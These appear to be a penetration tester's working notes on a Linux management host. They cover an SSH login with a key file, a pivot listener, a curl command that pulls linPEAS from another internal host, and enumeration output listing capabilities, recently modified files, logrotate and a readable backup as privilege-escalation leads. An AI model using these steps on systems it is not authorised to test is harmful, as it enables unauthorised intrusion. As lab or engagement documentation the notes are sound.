- Connection
```
ssh ssmallsadm@172.16.9.25 -i ssmallsadm-id_rsa
```
- add listener for second session
```
listener_add --addr 0.0.0.0:8888 --to 0.0.0.0:8888
```
- install linpeas after that
```
curl http://172.16.9.3:8888/enum/PEASS-ng/linPEAS/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
```
- `uname -a`
```
Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
- `lsb_release -a`
```
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:        20.04
Codename:       focal
```
# `ps aux`
- `/usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers`
- `/usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-f`
- `/usr/lib/policykit-1/polkitd --no-debug`
# winpeas
- Some interesting capabilities, specially  `gst-ptp-helper`
```
Files with capabilities (limited to 50):                                                          
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/snap/core20/1169/usr/bin/ping = cap_net_raw+ep
/snap/core20/1434/usr/bin/ping = cap_net_raw+ep 
```
- modified interesting files in the last 5mins
```
/home/ssmallsadm/.gnupg/pubring.kbx
/home/ssmallsadm/.gnupg/trustdb.gpg
/home/ssmallsadm/snap/lxd/common/config/config.yml   
```
- logrotate with writable files
```
logrotate 3.14.0
    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes
```
- readable backup
```
/var/backups/alternatives.tar.0 
```